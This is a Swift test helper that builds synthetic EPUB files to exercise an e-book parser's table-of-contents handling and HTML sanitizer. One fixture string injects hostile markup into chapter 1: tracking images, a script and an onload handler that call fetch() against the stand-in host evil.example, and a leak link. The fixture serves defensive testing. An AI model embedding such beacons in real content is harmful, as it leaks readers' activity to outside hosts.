import Foundation
import ZIPFoundation

/// Builds a minimal but valid synthetic EPUB on disk so `EpubDocument` can be exercised
/// headlessly without a captured AO3 file. Two flavours pin both TOC paths the parser
/// must handle: EPUB3 `nav.xhtml` (`flavour: .nav`) and EPUB2 `toc.ncx` (`flavour: .ncx`).
///
/// Real-AO3-EPUB validation is a separate manual fixture step (see PLAN-READER.md §9); this
/// proves the parsing *logic* against a controlled, known structure.
enum EpubFlavour { case nav, ncx }

enum SyntheticEpub {
    /// A remote image + script + onload handler + remote link — the exfiltration vectors the
    /// sanitizer must neutralize. Injected into chapter 1 when `remoteRefs` is set.
    static let hostileMarkup = """
        <img src="https://evil.example/track.png" alt="x"/>
        <img src="cover.png" alt="local-ok"/>
        <script>fetch('https://evil.example/beacon')</script>
        <a href="https://evil.example/leak">click</a>
        <p onload="fetch('https://evil.example')">hi</p>
        """

    /// Three chapters under `OEBPS/`, titled "Chapter One/Two/Three".
    static func make(flavour: EpubFlavour, remoteRefs: Bool = false) throws -> URL {
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent("synthetic-\(flavour)-\(UUID().uuidString).epub")
        let archive = try Archive(url: url, accessMode: .create)

        func add(_ path: String, _ string: String) throws {
            let data = Data(string.utf8)
            try archive.addEntry(with: path, type: .file, uncompressedSize: Int64(data.count)) { pos, size in
                data.subdata(in: Int(pos)..<Int(pos) + size)
            }
        }

        try add("mimetype", "application/epub+zip")
        try add("META-INF/container.xml", """
            <?xml version="1.0"?>
            <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
              <rootfiles>
                <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
              </rootfiles>
            </container>
            """)

        for (i, name) in ["One", "Two", "Three"].enumerated() {
            let extra = (i == 0 && remoteRefs) ? hostileMarkup : ""
            try add("OEBPS/ch\(i + 1).xhtml", """
                <?xml version="1.0" encoding="utf-8"?>
                <html xmlns="http://www.w3.org/1999/xhtml"><head><title>\(name)</title></head>
                <body><h1>Chapter \(name)</h1><p>Body text \(name).</p>\(extra)</body></html>
                """)
        }

        if flavour == .nav {
            try add("OEBPS/content.opf", """
                <?xml version="1.0" encoding="utf-8"?>
                <package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="bookid">
                  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
                    <dc:title>Synthetic Work</dc:title>
                    <dc:creator>Test Author</dc:creator>
                    <dc:language>en</dc:language>
                  </metadata>
                  <manifest>
                    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
                    <item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
                    <item id="c2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
                    <item id="c3" href="ch3.xhtml" media-type="application/xhtml+xml"/>
                  </manifest>
                  <spine>
                    <itemref idref="c1"/>
                    <itemref idref="c2"/>
                    <itemref idref="c3"/>
                  </spine>
                </package>
                """)
            try add("OEBPS/nav.xhtml", """
                <?xml version="1.0" encoding="utf-8"?>
                <html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
                <body><nav epub:type="toc"><ol>
                  <li><a href="ch1.xhtml">Chapter One</a></li>
                  <li><a href="ch2.xhtml">Chapter Two</a></li>
                  <li><a href="ch3.xhtml">Chapter Three</a></li>
                </ol></nav></body></html>
                """)
        } else {
            try add("OEBPS/content.opf", """
                <?xml version="1.0" encoding="utf-8"?>
                <package xmlns="http://www.idpf.org/2007/opf" version="2.0" unique-identifier="bookid">
                  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
                    <dc:title>Synthetic Work</dc:title>
                    <dc:creator>Test Author</dc:creator>
                    <dc:language>en</dc:language>
                  </metadata>
                  <manifest>
                    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
                    <item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
                    <item id="c2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
                    <item id="c3" href="ch3.xhtml" media-type="application/xhtml+xml"/>
                  </manifest>
                  <spine toc="ncx">
                    <itemref idref="c1"/>
                    <itemref idref="c2"/>
                    <itemref idref="c3"/>
                  </spine>
                </package>
                """)
            try add("OEBPS/toc.ncx", """
                <?xml version="1.0" encoding="utf-8"?>
                <ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
                <navMap>
                  <navPoint id="n1" playOrder="1"><navLabel><text>Chapter One</text></navLabel><content src="ch1.xhtml"/></navPoint>
                  <navPoint id="n2" playOrder="2"><navLabel><text>Chapter Two</text></navLabel><content src="ch2.xhtml"/></navPoint>
                  <navPoint id="n3" playOrder="3"><navLabel><text>Chapter Three</text></navLabel><content src="ch3.xhtml"/></navPoint>
                </navMap></ncx>
                """)
        }
        return url
    }

    /// Mirrors a real AO3/calibre EPUB: 5 spine docs [preface, titlePage, ch1, ch2, afterword]
    /// where the NCX lists Preface/Ch1/Ch2/Afterword but NOT the title page. Chapter 1 carries
    /// a `&nbsp;` entity and a remote image — to exercise entity-safe rendering + sanitization.
    static func makeAO3Like() throws -> URL {
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent("ao3like-\(UUID().uuidString).epub")
        let archive = try Archive(url: url, accessMode: .create)
        func add(_ path: String, _ s: String) throws {
            let data = Data(s.utf8)
            try archive.addEntry(with: path, type: .file, uncompressedSize: Int64(data.count)) { pos, size in
                data.subdata(in: Int(pos)..<Int(pos) + size)
            }
        }
        func page(_ body: String) -> String {
            "<?xml version='1.0' encoding='utf-8'?><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>t</title></head><body>\(body)</body></html>"
        }
        try add("mimetype", "application/epub+zip")
        try add("META-INF/container.xml", "<?xml version=\"1.0\"?><container version=\"1.0\" xmlns=\"urn:oasis:names:tc:opendocument:xmlns:container\"><rootfiles><rootfile full-path=\"content.opf\" media-type=\"application/oebps-package+xml\"/></rootfiles></container>")
        try add("split_000.xhtml", page("<h2>Preface</h2><p>tags and summary</p>"))
        try add("split_001.xhtml", page("<h1>The Work Title</h1>"))   // title page, absent from NCX
        try add("split_002.xhtml", page("<h2>Chapter 1</h2><p>Before&nbsp;<span>AFTER the entity</span></p><img src=\"https://evil.example/t.png\"/>"))
        try add("split_003.xhtml", page("<h2>Chapter 2</h2><p>more</p>"))
        try add("split_004.xhtml", page("<h2>Afterword</h2><p>end notes</p>"))
        let items = (0...4).map { "<item id=\"h\($0)\" href=\"split_00\($0).xhtml\" media-type=\"application/xhtml+xml\"/>" }.joined()
        let spine = (0...4).map { "<itemref idref=\"h\($0)\"/>" }.joined()
        try add("content.opf", "<?xml version='1.0'?><package xmlns=\"http://www.idpf.org/2007/opf\" version=\"2.0\" unique-identifier=\"b\"><metadata xmlns:dc=\"http://purl.org/dc/elements/1.1/\"><dc:title>The Work Title</dc:title><dc:creator>Auth</dc:creator></metadata><manifest>\(items)<item id=\"ncx\" href=\"toc.ncx\" media-type=\"application/x-dtbncx+xml\"/></manifest><spine toc=\"ncx\">\(spine)</spine></package>")
        try add("toc.ncx", "<?xml version='1.0'?><ncx xmlns=\"http://www.daisy.org/z3986/2005/ncx/\" version=\"2005-1\"><navMap><navPoint id=\"a\"><navLabel><text>Preface</text></navLabel><content src=\"split_000.xhtml\"/></navPoint><navPoint id=\"b\"><navLabel><text>Chapter 1</text></navLabel><content src=\"split_002.xhtml\"/></navPoint><navPoint id=\"c\"><navLabel><text>Chapter 2</text></navLabel><content src=\"split_003.xhtml\"/></navPoint><navPoint id=\"d\"><navLabel><text>Afterword</text></navLabel><content src=\"split_004.xhtml\"/></navPoint></navMap></ncx>")
        return url
    }
}
